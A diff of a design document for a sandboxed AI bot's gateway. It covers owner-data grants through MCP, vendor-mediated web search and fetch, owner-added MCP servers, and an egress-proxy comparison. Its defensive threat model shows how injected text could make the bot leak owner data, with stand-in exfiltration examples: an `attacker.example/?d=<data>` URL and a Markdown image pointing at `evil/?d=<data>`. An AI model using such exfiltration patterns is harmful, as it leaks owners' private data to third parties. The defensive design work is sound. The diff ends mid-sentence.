@@ -8,7 +8,7 @@ Today Main can only talk to its model. It cannot read the owner's data, search t
 which makes it a chat box. This plan gives it three capabilities, each opt-in per owner, built in this order:
 
 1. the owner's own TinyCloud data, read only, through the hosted MCP (`https://mcp.tinycloud.xyz/mcp`);
-2. web search and page fetch, done by the gateway;
+2. web search and page reading, done by the search vendor through the gateway;
 3. remote MCP servers the owner adds themselves.
 
 All three follow the same rules: the sandbox never holds a credential and never has a network, the gateway holds
@@ -40,8 +40,13 @@ Main's use of the access, not the delegation underneath, until decision 2 (secti
     `account.tinycloud.xyz/delegations`.
   - The MCP logs only the tool name, a result code, the duration and a replay count.
   - The TinyChat backend already reaches the MCP for meeting transcripts with an owner-signed, read-only grant to a
-    service identity (`MCP_CHAT_*`, `backend/src/mcp-meetings`). That path accepts exactly one grant shape (the
-    connectors database and prefix, read only, at most 30 days), so it cannot carry this design as it is.
+    service identity (`MCP_CHAT_*`, `backend/src/mcp-meetings`; the MCP's `/native/grant`, js-sdk `packages/mcp` read at
+    `ae3b37c4`, 2026-10-29, to be confirmed against the deployed MCP). It is a separate path from OAuth: the MCP keeps
+    that grant in a tenant of its own keyed by the owner DID, calls carry a service credential and an owner-DID header,
+    and the MCP refuses any request that carries an `Origin` header. Today it accepts exactly one grant shape (the
+    connectors database and prefix, read only, at most 30 days), exposes only `tinycloud_sql_query` and
+    `tinycloud_kv_get` to it, has one service identity and one credential, holds one grant per owner (a later grant
+    that would end earlier is refused) and has no route to revoke a grant.
 
 ## Design
 
@@ -58,65 +63,59 @@ The gateway reads the JSON-RPC request and rebuilds it, as it does for chat bodi
 `notifications/initialized`, `ping`, `tools/list` and `tools/call`. Everything else (resources, prompts, sampling,
 elicitation, roots) is answered locally with a fixed error and never sent. `tools/call` is passed only for a tool on the
 bot's allowlist; `tools/list` answers are rebuilt from that list. The gateway owns every upstream MCP session id and
-`Authorization` header; the sandbox sees neither. The only hosts the gateway ever calls for a bot are: the model
-origin, `mcp.tinycloud.xyz/mcp` (phase 1), the search provider and guarded page fetches (phase 2), and the owner's
-servers (phase 3).
+`Authorization` or credential header; the sandbox sees neither. The only hosts the gateway ever calls for a bot are: the
+model origin, `mcp.tinycloud.xyz` (phase 1), the search vendor's API host (phase 2), and the owner's servers (phase 3,
+through the outbound hop in the Egress section).
 
 `GET` (the SSE stream) and `DELETE` on `/v1/mcp` are refused (405), so the sandbox cannot open a server-to-client stream
 or end a session. The gateway strips `Mcp-Session-Id` from every reply.
 
 ### 2. Who holds the grant
 
-Two things are involved and they must not be confused. The **token** is an OpenKey OAuth access token (and, for a
-standing grant, its refresh token) for the owner, kept in the gateway, outside the sandbox, like the model key. The
-**delegation** behind it (the authority the node checks) is held by the hosted MCP, not by the gateway.
+**Recommended: the native-grant pattern the backend already uses for transcripts** (facts under Today). The owner's
+browser signs a narrow, expiring delegation to a service identity, as Main's history grant already does
+(`frontend/src/bots/historyGrant.ts`). The backend checks it and hands it to the MCP once, and the MCP holds it. The
+gateway holds no OAuth token, refresh token or delegation: it holds a service credential and sends the owner's DID.
 
-**Precondition (decision 2, nothing below ships without it).** The hosted MCP stores delegations per tenant, and a tenant
-is keyed by the OpenKey subject alone, not by OAuth client or audience (js-sdk `packages/mcp`, `remote-store.ts`
-tenant id, and the identity read in `http.ts`). So on `/mcp`:
-- Main would use any delegation the owner approved for another MCP client (a chat app, a desktop client) without an
-  approval for Main; and
-- whatever Main's flow approves becomes usable by those clients.
+- **Approval.** The owner picks what Main may read and for how long; their browser signs the delegation (space,
+  prefixes or databases, read actions, expiry). The backend runs the checks `validateSignedMcpGrant` runs today: the
+  delegate is Main's service DID, the delegator is the signed-in user (the owner DID comes from the authenticated
+  session, never a request body), the expiry is within the ceiling, and nothing is granted beyond the permitted read
+  permissions. It posts the delegation to `/native/grant` with the service credential, and the MCP derives the owner
+  from the signed grant itself.
+- **Calls.** The gateway sends the service credential and the owner DID the supervisor registered for that bot
+  (`PUT /bots/<botId>` carries only the token today and gains the owner DID). It never uses anything the sandbox sends:
+  the identity comes from the socket, not from the model. The credential is a gateway secret in its environment, like
+  the model key; the sandbox, the supervisor's saved state and the bot state never hold it. There is no code exchange,
+  `state`, refresh token or token file in this path, so the login-CSRF and mix-up risks of an OAuth exchange do not
+  arise; what stands in their place is the backend's check that the delegator is the signed-in user.
+- **Windows.** The expiry is signed into the delegation, so the node refuses it afterwards. "Just for this task" is a
+  delegation that expires in 1 hour at most, and the gateway also stops using it when Main's turn settles. "For 7
+  days" is a 7-day delegation, offered only after a warning screen, with no silent renewal: a renewal is a new
+  signature by the owner. No default, no nudge.
+- **Revoke.** There is no route to revoke a native grant. Disconnect ends Main's use of it (the gateway marks the bot's
+  grant ended and refuses before calling the MCP); the delegation itself ends at its signed expiry. That is why the
+  windows are short, and the copy says when it ends.
 
-"You pick what Main can read" is not enforced by anything under that keying, and the gateway's tool list does not
-limit scope. Main therefore needs either its own restricted MCP address with separate tenant state (the pattern the
-restricted per-client addresses use), or an MCP that keys tenants by subject and client. Whether the existing
-restricted surfaces expose the read tools Main needs is to be confirmed; a new surface may be needed.
+**Precondition (decision 2): the MCP does not do this for Main yet, and nothing below ships until it does.**
+1. *Shape and tools.* The MCP accepts exactly the connectors permissions and exposes two tools to a native identity.
+   Main needs a ceiling that lets the owner pick spaces, prefixes and databases (read only) and the read tools in
+   section 3.
+2. *Its own identity and tenant.* The MCP has one service identity, one credential and one grant per owner. If Main
+   used them, (a) its grant would collide with the transcript grant (a different or shorter grant is refused), (b) Main
+   could use what the transcript grant covers, and (c) the gateway's credential would reach every owner who has
+   granted the backend. Main needs its own service DID, credential and tenant namespace, so that compromising the
+   gateway reaches only grants made to Main.
+3. *Shorter windows.* A later grant that would end earlier than the stored one is refused today; a 1-hour grant after a
+   7-day one needs an explicit replace rule.
 
-- It gets to the gateway once, at approval. The owner approves in OpenKey in their browser and the TinyChat backend
-  receives the authorization code. The OAuth flow is bound to the person and the bot:
-  - PKCE is required, and `state` is a single-use value the backend stores server-side with a short life, tied to the
-    signed-in TinyChat user and the `botId`. The callback is rejected if `state` is missing, reused, expired, or does not
-    match that user and bot.
-  - The backend passes the code, the PKCE verifier and the expected OpenKey subject (the user's linked OpenKey
-    identity) to the supervisor over the existing service-authenticated call, and the supervisor hands them to the
-    gateway over its admin socket (`PUT /bots/<botId>/mcp-grant`).
-  - The gateway does the code exchange, then checks that the token's subject equals the expected subject. On a
-    mismatch it discards the token and the grant fails with `owner_mismatch`. Without this check a login CSRF or an
-    OAuth mix-up attaches another person's token to a bot.
-  - The token is first seen inside the gateway; the backend and supervisor never see, log or store it.
-- A one-off grant lives only in the gateway's memory. A gateway restart ends it, which is the same as it expiring.
-- A standing grant (7 days, renewing) must survive a restart, so the gateway writes its refresh token to its own volume,
-  encrypted (AES-GCM, key from the gateway's environment like the model key), mode 0600.
-- The sandbox, the supervisor and the saved bot state never hold the token. The gateway removes the `Authorization`
-  header and any token from everything it returns, and it strips the approval link from an `authority_required` result
-  (the link goes to the owner through the supervisor's event stream, section 3, never to the model).
-- Windows the owner picks:
-  - **One-off**: 1 hour at most, for one task, no renewal. The gateway ends it when Main's turn settles or after 1
-    hour, whichever is first.
-  - **Standing**: 7 days, renewing, only if the owner picks it, and only after a warning screen. No default, no nudge.
-  - The extra warning and "Reject this permission" for another app's data or cross-app access are OpenKey's to build
-    (decision 1). The MCP's delegation approval goes through OpenKey's `/delegate` link flows, which show no such
-    screen today, and the draft that adds it (#538) does not cover them (its security review confirmed that ticket and
-    link flows skip both the warning and the share rule). This plan depends on it and does
-    not rely on it existing.
-- **What these windows bound today.** The gateway enforces them on the token only: it stops attaching the token and
-  revokes it at OpenKey. The delegation underneath lasts as long as the MCP's delegation expiry (30 days in
-  production), cannot be revoked early (TC-1156), and lives in the MCP, so ending the token does not end it. Until
-  decision 2 gives a per-request expiry (or Main's own address with its own shorter delegation), the 1-hour and 7-day
-  windows are token-only, and no owner-facing line may say the access ends at 1 hour or after 7 days.
-- The access token is valid at the MCP for up to 12 hours whatever the grant says, so revoking it at OpenKey (section
-  3) matters even when the gateway has already stopped using it.
+**Why not OAuth** (the fallback, and why it was set aside): the hosted `/mcp` OAuth route keys tenants by the OpenKey
+subject alone, so Main would use any delegation the owner approved for another MCP client, and what Main's flow
+approves would become usable by those clients. It holds 30-day delegations that cannot be revoked early (TC-1156), so
+a 1-hour or 7-day window would be token-only. Its approval goes through OpenKey's `/delegate` link flows, which show
+no extra warning or "Reject this permission" (the #538 security review confirmed that ticket and link flows skip both).
+And it puts an access token and a refresh token in the gateway, which needs the code exchange bound to the user and
+the bot. Those bindings are written down in phase 3, because owner-added servers use them.
 
 ### 3. Limits, budgets, audit, revoke, what the owner sees
 
@@ -132,11 +131,9 @@ authority or return secrets:
   `tinycloud_sql_execute`, `tinycloud_apps_write`, `tinycloud_apps_query`, `tinycloud_apps_context`,
   `tinycloud_account_applications_list`. A write phase needs its own plan and its own approval copy.
 
-**Once decision 2 is built**, the delegation is the real limit: the owner picks the space and prefixes or databases when
-approving, and the node refuses anything outside them. Until then it is not: under the shared tenant, delegations the
-owner approved for other MCP clients are usable by Main (section 2), so the gateway's list and budgets are the only
-limit Main has, and nothing in this design ships without decision 2. The gateway's list is a second layer, not the
-first. Build confirms that
+The delegation is the real limit, **once decision 2 is built**: the owner picks the space and prefixes or databases
+when signing it, and the node refuses anything outside them. The gateway's list is a second layer, not the first.
+Today a native identity sees two tools and one fixed shape, so none of this exists yet. Build confirms that
 `tinycloud_sql_query` is held read-only by the node's delegation (a read-only database permission) and not only by the
 tool's name.
 
@@ -145,26 +142,24 @@ day, 500 calls; one call in flight per bot; 20 s per call; results already cappe
 Results enter the model's context, so they also count against the existing per-bot and global token budgets.
 
 **Audit.** The gateway logs counts, never content: per bot (hashed id) and day, calls by tool name and outcome
-(`ok`, `tool_not_permitted`, `grant_ended`, `authority_required`, `mcp_unavailable`, `budget`), bytes returned. No
-arguments, no results, no token, no approval link. The owner sees the same counts in Main's settings.
+(`ok`, `tool_not_permitted`, `grant_ended`, `grant_refused`, `mcp_unavailable`, `budget`), bytes returned. No
+arguments, no results, no credential. The owner sees the same counts in Main's settings.
 
-**Revoke.** Disconnect in Main's settings tells the backend, which tells the supervisor, which has the gateway delete
-the in-memory grant **and the encrypted refresh-token file**, and call OpenKey's revoke for the access and refresh
-tokens. The gateway checks the grant on every call, so the next call is refused. At the MCP the token is inactive within
-about 30 s. The owner can also remove the connection on the OpenKey account page, which ends the token the same way.
-The delegation underneath is not ended by any of this: it cannot be revoked early (TC-1156) and stays valid for the
-MCP's delegation expiry (30 days in production). Until decision 2 lands, Disconnect ends Main's use of it, not its
-existence.
+**Revoke.** Disconnect in Main's settings tells the backend, which tells the supervisor, which has the gateway mark the
+bot's grant ended; the gateway checks that on every call, so the next call is refused before it reaches the MCP. The
+delegation underneath is not ended by this: there is no route to revoke a native grant, so it stays in the MCP until
+its signed expiry (1 hour or 7 days). Disconnect ends Main's use of it, not its existence, and the copy says when it
+ends. A shorter signed expiry is the only early end.
 
 **What the owner sees** (copy for review; every string lives in the bots strings module):
 
 | Where | Draft |
 | --- | --- |
 | Main's settings, off | "TinyCloud data" / "Main can't read your TinyCloud data." / button "Let Main read it" |
-| Choice sheet | **Held until decision 2 lands** (the 1-hour and 7-day lines are not yet true): "Let Main read your TinyCloud data?" / "Main can read what you pick, nothing else. It can't change anything. What it reads is sent to the AI model service to write its answer." / options "Just for this task" (selected), "For 7 days" / "You pick what Main can read" (app list, none selected) |
-| After "For 7 days" | **Held until decision 2 lands:** warning screen: "Keep Main's access for 7 days?" / "Main will keep reading what you picked, and the access renews on its own, until you turn it off or 7 days pass." / "Keep it to this task" / "Allow 7 days" |
-| Approval | OpenKey's own screen. No claim about an extra warning or "Reject this permission" until decision 1 ships them |
-| Active | **Held until decision 2 lands** (the end time is not yet true of the delegation): "Main can read <apps> until <time>." / "Used 12 times today." / button "Disconnect" |
+| Choice sheet | **Held until decision 2 is built** (the windows are not yet true): "Let Main read your TinyCloud data?" / "Main can read what you pick, nothing else. It can't change anything. What it reads is sent to the AI model service to write its answer." / options "Just for this task" (selected), "For 7 days" / "You pick what Main can read" (app list, none selected) |
+| After "For 7 days" | **Held until decision 2 is built:** warning screen: "Keep Main's access for 7 days?" / "Main will keep reading what you picked until you turn it off or 7 days pass. It will not renew on its own." / "Keep it to this task" / "Allow 7 days" |
+| Approval | The owner's signing step in the browser (the step Main's history grant uses). No claim about an extra warning or "Reject this permission" |
+| Active | **Held until decision 2 is built:** "Main can read <apps> until <time>." / "Used 12 times today." / button "Disconnect". After Disconnect: "Main has stopped. The permission itself ends <time>." |
 | Ended | "Main's access to your TinyCloud data has ended." / "Give Main access again" |
 
 Copy goes to Monica before any of it ships. It makes no claim about encryption or about what Main may do later.
@@ -176,26 +171,43 @@ Each answers the model with a fixed one-line error (no upstream text) and logs a
 | Case | What happens |
 | --- | --- |
 | Grant expired, revoked or gateway restarted | `grant_ended`. The model is told access ended. The supervisor sends the owner a `grant_needed` event; the "Ended" line shows. No retry loop. |
-| MCP down, 5xx, timeout, or the MCP's `server_error` because OpenKey is unreachable | `mcp_unavailable`. No retry of the call. After 3 in a row the gateway refuses for 60 s. The turn goes on without the data. |
+| MCP down, 5xx, timeout, or `native_grant_validation_unavailable` (503) | `mcp_unavailable`. No retry of the call. After 3 in a row the gateway refuses for 60 s. The turn goes on without the data. |
 | Tool not on the allowlist | Refused locally, `tool_not_permitted`; never sent. |
-| `authority_required` (Main asked for more than the owner approved) | The approval link is stripped from the result; the owner gets "Main needs more access: <what>" with a Review button that opens OpenKey. `<what>` is built by the gateway from the MCP's structured authority request (space, prefix or database, action), never from model text or the tool's message, so injected text in data Main read cannot word the request. The owner sees exactly what OpenKey will ask. Nothing is widened automatically. |
-| `invalid_token` / 401 | Treated as the grant ending, as the first row. |
+| The node refuses a call outside the grant (Main asked for more than the owner signed) | The model gets a fixed one-line error; counted as `grant_refused`. The owner gets "Main asked for something you didn't allow: <what>" with a "Change access" button that opens TinyChat's own signing sheet. `<what>` is built by the gateway from structured fields (tool name, space, prefix or database), never from model text or the node's message, so injected text in data Main read cannot word the request. Nothing is widened automatically. |
+| 401 `native_grant_required`, `native_grant_expired` or `native_grant_rejected` | Treated as the grant ending, as the first row. |
 | Over a per-task or per-day budget, or a second call in flight | Refused, `budget`, with the body unread. |
 | Oversize or malformed response | Dropped; `mcp_unavailable`. |
 
 ## Web access (phase 2)
 
-The gateway offers two tools, `web__search` and `web__fetch`, and makes the calls itself. The sandbox has no raw
-network and gets no new route beyond `/v1/mcp`.
+The gateway offers two tools, `web__search` and `web__fetch`. The search vendor makes the outside calls: search is
+Tavily Search and reading a page is Tavily Extract, so the gateway dials only the vendor's API host. A page's own
+server never sees our addresses, and the gateway never opens a connection to an address a page or the model named. The
+sandbox has no raw network and gets no new route beyond `/v1/mcp`.
 
-**Search provider.** The provider key is a gateway credential, like the model key. Candidates, none chosen:
-Tavily (the backend already uses it for chat web search, `backend/src/mcp-meetings/web-search.ts`, and it also has a
-page-extract API), Brave Search API, Exa, Kagi, or a self-hosted SearXNG (no key, but another container to run and
-upstream engines that can block it). All except SearXNG are paid keys. **No key is added until it is decided**, and the
-bots service gets its own dedicated key with its own provider-side budget, not the backend's. Search queries leave the
-TinyCloud trust boundary to the provider, and the owner copy must say so.
+**Provider.** Tavily, which the backend already pays for. Checked in the code: the backend reads `TAVILY_API_KEY` from
+its environment (`docker-compose.phala.yml`, `backend/src/mcp-meetings/config.ts`) and calls only
+`POST https://api.tavily.com/search` with the key in the JSON body, `max_results: 5`, `include_answer: true` and
+`search_depth: "basic"` (`backend/src/mcp-meetings/web-search.ts`). So this plan adds no provider and no account. Two
+things are not what the backend does today, and are not assumed: (1) it never calls Extract, so whether the plan
+covers `/extract`, and at what price, is unchecked; (2) bots run in their own compose project, so "the existing key"
+means the same secret held a second time in the bots gateway's environment, and chat web search and Main would draw on
+one provider budget. A separate key under the same account, if Tavily offers one, keeps budgets and rotation apart;
+that is the only open choice (decision 4). Brave, Exa, Kagi or a self-hosted SearXNG are alternatives, not proposals.
+Search queries and page URLs go to the vendor, and the owner copy says so.
 
-**Fetch guards.** Every fetch, and every redirect hop, goes through one guard:
+**Checks before a call.**
+- `web__fetch` takes one URL: scheme `https` or `http` only; no user info; ports 80 and 443 only; no IP literal and no
+  single-label or `localhost` name; at most 2,048 characters. The vendor does the connecting, so SSRF into our network
+  is closed by construction; these checks keep nonsense from reaching it.
+- While the conversation is marked as holding owner data, the URL must have come from a search result in this
+  conversation or from the owner (the exfil rule, below).
+- Time: 20 s per call. Size: the returned text is cut at 40,000 characters; anything but plain text from the vendor is
+  dropped. The result is wrapped as untrusted content (below).
+- Fetching through a vendor does not stop exfiltration: `https://attacker.example/?d=<data>` through Extract still
+  delivers the data to the attacker. Only the exfil rule does that.
+
+**Dial guard** (phase 3, and any direct fetch added later). Every request the gateway makes to a host the owner or a page named, and every redirect hop, goes through one guard. It is its own module with its own tests, built before phase 3:
 - Scheme `https` or `http` only; no user info in the URL; ports 80 and 443 only; no non-HTTP schemes of any kind.
 - The host is resolved by the gateway and **every** address returned is checked; the connection is then made to the
   address that was checked (not resolved again), with the original host in SNI and `Host`. That closes DNS rebinding
@@ -211,19 +223,14 @@ TinyCloud trust boundary to the provider, and the owner copy must say so.
   resolve into the gateway's own compose network are refused by the same rule.
 - At most 3 redirects, each re-checked from the start (scheme, host, address); a redirect to a refused target ends the
   fetch.
-- GET only; no cookies, no request body, a fixed `User-Agent`, and no header taken from the sandbox.
-- Time: 5 s to connect, 15 s total. Size: 1 MiB of body after decompression, read as a stream and cut at the cap.
-- Content types: `text/html`, `text/plain`, `text/markdown`, `application/json`, `application/xml`, `text/xml`,
-  `application/xhtml+xml`. Anything else is refused, as is a body that does not match its type (for example a
-  `%PDF` or image magic number behind `text/html`).
-- The gateway turns HTML into plain text (scripts, styles and hidden elements dropped) and returns at most 40,000
-  characters, wrapped as untrusted content (below).
+- No cookies, no request body taken from the sandbox, a fixed `User-Agent`. Time and size caps are per call type (an
+  owner-added server: 10 s to connect, 20 s per call, 256 KiB per result).
 
 **Budgets** (starting values): per task, 10 searches and 20 fetches; per bot per day, 100 searches and 300 fetches;
 a global daily cap; one web call in flight per bot. Returned text also counts against the token budgets.
 
-**Audit and owner view.** Counts by tool and outcome (`ok`, `blocked_address`, `blocked_scheme`, `too_large`,
-`wrong_type`, `timeout`, `budget`), bytes returned. No query, no URL, no page text. The settings row shows "Main
+**Audit and owner view.** Counts by tool and outcome (`ok`, `blocked_url`, `blocked_by_rule`, `too_large`,
+`provider_error`, `timeout`, `budget`), bytes returned. No query, no URL, no page text. The settings row shows "Main
 searched 4 times and read 9 pages today." Blocked attempts are counted separately so a spike is visible.
 
 **Owner control.** Web access is off by default and is a per-owner switch with two choices, "Just for this task" and
@@ -245,14 +252,34 @@ instructions, and the design does not rely on the model to tell the difference:
   that read it ends, so a later task with no grant-bearing call still holds it. The gateway therefore marks a bot's
   conversation as holding owner data from the first grant-bearing result, and clears the mark only when the supervisor
   tells it the conversation was reset with a fresh context (the gateway cannot see what a summary kept, so a summary
-  does not clear it). While marked, exactly one of these rules applies, chosen in decision 5, to `web__fetch`,
-  `web__search` and every owner-added server's tools:
-  - **(a) Strict.** No open fetch and no owner-added server calls. Recommended starting point.
-  - **(b) Narrowed.** Fetch only through a gateway-built search call whose query is shown to the owner or length-capped
-    (200 characters), plus URLs the owner typed or a search in the same conversation returned. Owner-added server calls
-    are blocked. This narrows the channel and does not close it: a query or a path can still carry a few words.
+  does not clear it). The order does not matter: if web content arrived first and a private read follows, the read sets
+  the mark and the rule applies from then on. While marked, exactly one of these rules applies, chosen in decision 5, to
+  `web__fetch`, `web__search` and every owner-added server's tools:
+  - **(a) Strict.** `web__search`, `web__fetch` and every owner-added server call are all refused. Nothing leaves.
+  - **(b) Narrowed. Recommended.** `web__search` still works, with the query capped at 200 characters and shown in the
+    owner's activity view. `web__fetch` accepts only a URL that a search in this conversation returned or that the
+    owner typed (the gateway records both; the supervisor hands it URLs from the owner's messages). Owner-added server
+    calls are refused. This narrows the channel and does not close it: a query or a choice among results can still
+    carry a few words.
   - **(c) Owner confirms** (outside the model) each new domain before the first fetch to it, and each owner-added
-    server before its first call, while marked. The first loosening to consider after (a).
+    server before its first call, while marked. The first loosening to consider after (b).
+
+  Under any of the three, an outbound write is never automatic: a TinyCloud write, an owner-added server tool the
+  owner has not marked read-only, or anything that sends data to a third party needs the owner's approval outside the
+  model, every time, and is never auto-approved. (Writes are not exposed in phase 1.)
+- **Replies are an exfil channel too, and no egress layer sees them.** A reply that contains `![](https://evil/?d=<data>)`
+  leaks the data the moment a renderer loads the image, with no click. Main's reply is plain text today
+  (`frontend/src/bots/MainChat.tsx` renders it in a `<p>` with `whitespace-pre-wrap`: no Markdown, no images, no links),
+  so the path is closed now and opens when replies move to Markdown. The general chat's renderer
+  (`components/assistant-ui/markdown-text.tsx`, `remark-gfm`, no image override) would load such an image. The rule:
+  1. Text the model wrote is never rendered with remote images, on any surface (chat, a card, a notification, a share):
+     the renderer drops the image and shows its alt text and address as plain text. Nothing the model wrote loads on
+     its own.
+  2. A link in model text is plain text until the owner taps it; the destination host is shown, bare addresses are not
+     auto-linked, and while the conversation is marked a tap goes through an "Open <host>?" step.
+  3. A second layer that does not trust the first: while marked, the layer that sees the final reply text strips
+     Markdown image syntax and HTML tags from it.
+  This ships no later than phase 2, and is a frontend change that belongs to the surface that renders the reply.
 
 ## Owner-added MCP servers (phase 3)
 
@@ -260,10 +287,14 @@ The owner can add a remote MCP server (streamable HTTP) so Main can use its tool
 and enforced by the gateway.
 
 **Adding one.** Settings, "Tools Main can use", "Add a tool server". The owner enters an `https` URL (no `http`, no
-user info, port 443 only). The gateway, not the backend or the browser, contacts it, through the same guard as page
-fetches (resolve, check every address, connect to the checked address, no redirects on MCP calls, 10 s total). It runs
+user info, port 443 only). The gateway, not the backend or the browser, contacts it, through the dial guard and the
+outbound hop (Egress section): resolve, check every address, connect to the checked address, no redirects on MCP
+calls, 10 s total. It runs
 `initialize` and `tools/list` and returns what the owner needs to decide: the host, the server's own name, and its
 tools by name and description.
+
+Writes stay off. A tool counts as read-only only if the owner marks it so when choosing tools (the server's own hints
+are shown, never trusted), and every call to any other tool needs the owner's approval each time (the exfil rule).
 
 **What the owner approves, per server:**
 1. the server (its host is shown exactly as it will be contacted);
@@ -273,18 +304,28 @@ tools by name and description.
    TinyCloud data, and no silent renewal.
 
 **Credential.** If the server supports the MCP authorization flow (OAuth with PKCE), the owner signs in at the server's
-authorization server in their browser and the gateway does the code exchange, as in section 2. The server itself names
-its authorization server during discovery, so a malicious server could name a real one (GitHub, Google), the owner
-would approve at a screen they trust, and the gateway would then hand that token to the malicious server. So:
-- The add screen shows the authorization server's host next to the server's, and requires an explicit confirmation when
-  they are different sites ("This server asks you to sign in at <host>").
+authorization server in their browser and the gateway does the code exchange. The flow is bound to the person and the
+bot:
+- PKCE is required, and `state` is a single-use value the backend stores server-side with a short life, tied to the
+  signed-in TinyChat user and the `botId`. The callback is rejected if `state` is missing, reused, expired, or does not
+  match that user and bot.
+- The backend passes the code and the PKCE verifier to the supervisor over the existing service-authenticated call, and
+  the supervisor hands them to the gateway over its admin socket. The token is first seen inside the gateway; the
+  backend and supervisor never see, log or store it.
+
+The server itself names its authorization server during discovery, so a malicious server could name a real one
+(GitHub, Google), the owner would approve at a screen they trust, and the gateway would then hand that token to the
+malicious server. So:
+- The add screen shows the authorization server's host next to the server's, and requires an explicit confirmation
+  when they are different sites ("This server asks you to sign in at <host>").
 - The authorization request carries the RFC 8707 `resource` parameter set to the server's exact URL, and the gateway
   attaches a token only to the resource it was issued for, never to another server or path.
-- The `state` is bound to the owner and the bot, as in section 2.
+
 If it takes a bearer key instead, the owner pastes it once into a field that posts it to the supervisor and on to the
 gateway; the browser, backend and supervisor do not keep it, and request-body logging is off for that route in the
-backend and the supervisor. The gateway holds it as in section 2 (memory for one task; encrypted on its volume for 7
-days). The token endpoint and every URL the gateway fetches for the flow go through the same guard.
+backend and the supervisor. The gateway holds a token or key in memory for one task and, for 7 days, in a file on its
+own volume, encrypted (AES-GCM, key from the gateway's environment like the model key), mode 0600; Remove deletes the
+file. The token endpoint and every URL the gateway fetches for the flow go through the dial guard.
 
 **Per-server tool allowlist and pinning.** Tools are exposed as `<slug>__<tool>`. The gateway hashes each approved
 tool's name, description and input schema at approval. If the server later changes one, that tool is withheld until the
@@ -320,6 +361,14 @@ tool changed, over budget.
 | Server, ended | "<name> access has ended." / "Add it again" |
 
 ## Egress layer: iron-proxy and the alternatives
+
+**Decision (the result of this section).** Keep `--network=none` and the per-bot socket: the Bun gateway is the single
+policy point and every capability is a gateway route. iron-proxy is **not** adopted now. Phases 1 and 2 need no outbound
+hop: phase 1 dials one fixed host and phase 2 dials only the search vendor's API host. For phase 3, owner-added
+servers, the outbound hop is **Stripe's Smokescreen**, a CONNECT forward proxy that refuses non-public addresses by
+default, on a network of its own and behind the gateway's own guard; a spike confirms it first. iron-proxy's default-deny
+per-tool MCP allowlist idea is copied into the gateway. The reasons are under "Recommendation"; the rest of this section
+is the evaluation they come from.
 
 Question: should the gateway's outbound traffic (all three capabilities) go through
 [iron-proxy](https://github.com/paradigmxyz/iron-proxy), an open-source egress firewall for untrusted workloads?
@@ -386,8 +435,9 @@ argument conditions, and filters `tools/list` responses, including per SSE event
   proxy then holds the same trust as the gateway, not a smaller one, and the gateway is no longer the only component
   that holds both secrets and internet access.
 - **With `tls.mode: sni-only` and CONNECT passthrough** there is no interception and no CA in the gateway, so the proxy
-  never sees a token or a page. The host allowlist and the dial-time deny list still apply (reported from a trial of an
-  older release; the spike confirms). Path, secret-swap and MCP transforms are lost, which costs little because the
+  never sees a token or a page. The host allowlist and the dial-time deny list still apply (this comes from a read of
+  older code, not a trial on v0.56.0; the spike confirms). Path, secret-swap and MCP transforms are lost, which costs
+  little because the
   gateway already does MCP policy and holds the tokens, and static keys then stay in the gateway.
 - **Leaning:** passthrough, unless the spike shows a need for interception. The spike compares both. If interception is
   kept anyway (for the secret swap or MCP transforms), the card must say so plainly: the proxy joins the gateway's trust
@@ -460,21 +510,51 @@ argument conditions, and filters `tools/list` responses, including per SSE event
   and corporate sign-in; neither fits a sandbox that must stay inside the attested CVM.
 - Not surveyed: Fly Machines and Envoy's dynamic forward proxy (alternatives to Smokescreen).
 
+### Smokescreen compared (brief)
+
+| | iron-proxy | Smokescreen |
+| --- | --- | --- |
+| What it is | Egress firewall: DNS plus HTTP(S) listeners or a tunnel, TLS interception, a transform pipeline, MCP policy | Forward proxy, CONNECT only, no TLS interception |
+| Addresses | The default deny list is cloud metadata and loopback; private ranges are ours to add | Resolves the name and refuses non-public addresses by default |
+| Secrets | Swaps proxy tokens for real keys (interception only) | None: the gateway keeps every secret |
+| Per client | One policy per process | A per-client ACL keyed on an mTLS identity, with rate and concurrency limits |
+| CA in the gateway | Yes, in interception mode | No |
+| Fit for phase 3 | More than is needed, with the costs below | The one thing phase 3 needs: dialing arbitrary owner hosts without reaching our own addresses |
+
+Smokescreen's details come from the survey and its README; we have not run it. Points for the spike: it is reachable by
+anything on its network unless mTLS is configured, so the same rule applies (only `bots-gateway` reaches it); because
+the proxy re-resolves the name, the gateway's own guard and the full deny list (including the embedded-IPv4 forms and
+our Docker subnets) still run on both sides; and its maintenance status is unchecked.
+
 ### Recommendation, and the spike that decides it
 
-**Recommendation.** Do not adopt iron-proxy for phases 1 and 2. Phase 1 has one fixed destination, which the gateway's
-pinned origin already covers. Phase 2 can be built so the CVM only dials fixed vendor hosts (search, and optionally
-extract) or with the gateway's own guard, and the costs above (an unauthenticated TLS-intercepting tunnel and a CA to
-guard, one dominant maintainer, unsigned releases, recent advisories) buy little there. Phase 3, arbitrary owner hosts,
-is where a dedicated dial-out hop earns its place. Choose between Smokescreen (preferred on the survey's evidence:
-smaller, public-addresses-only by default, no interception) and iron-proxy (more features, all the costs above), after
-the spike below. In every case: a network of its own without ingress, fail closed, the gateway keeps its own guard and
-all per-owner secrets, and iron-proxy's MCP policy ideas (default-deny tools, argument conditions, `tools/list`
-filtering) are copied into the gateway's rules rather than depended on. Revisit iron-proxy if bots ever need raw package
-or `curl` access; it would then sit behind the gateway.
+**Recommendation.** As the decision at the top of this section. Reasons iron-proxy is not adopted now (from reading its
+code and docs, not running it):
+- One global policy per process and no per-bot identity (a client shows up only as a source address in its audit log),
+  so per-owner policy would mean one proxy per bot with reloads; it has no rate limits or budgets, which ours already
+  have per bot.
+- It works through DNS steering plus HTTP and HTTPS listeners, or a tunnel listener. It has no Unix-socket client
+  listener, enforcing it against code that ignores proxies needs a network namespace and nftables (`CAP_NET_ADMIN`),
+  and interception needs its CA trusted in every sandbox. That reopens the network `--network=none` closed.
+- With interception, placement B terminates TLS: the proxy sees every token and page and its CA can impersonate any
+  upstream to the gateway, so it joins the gateway's trust boundary instead of being a smaller outer ring (the trust
+  difference above).
+- Its default deny list is metadata and loopback only, so RFC 1918, CGNAT, our Docker subnets and the embedded-IPv4
+  forms are ours to maintain; the listener has no authentication; the audit logs paths and has no rotation.
+- Its MCP policy covers tools only (resources and prompts are not enforced). An advisory (GHSA-vfgh-6jv3-4348, fixed in
+  0.50.0) let a `tools/call` with a non-JSON `Content-Type` bypass the tool allowlist, the parser-differential kind of
+  bug a policy engine in the middle is prone to. Open issues include #278 (secrets are swapped on plain HTTP) and the
+  ones listed under Maturity.
+- Pre-1.0, one dominant maintainer, unsigned images, checksums only on recent releases.
 
-Spike before phase 3, for the chosen hop (1 to 2 days, throwaway CVM or locally; items 4 and 6 are specific to
-iron-proxy, the rest apply to either):
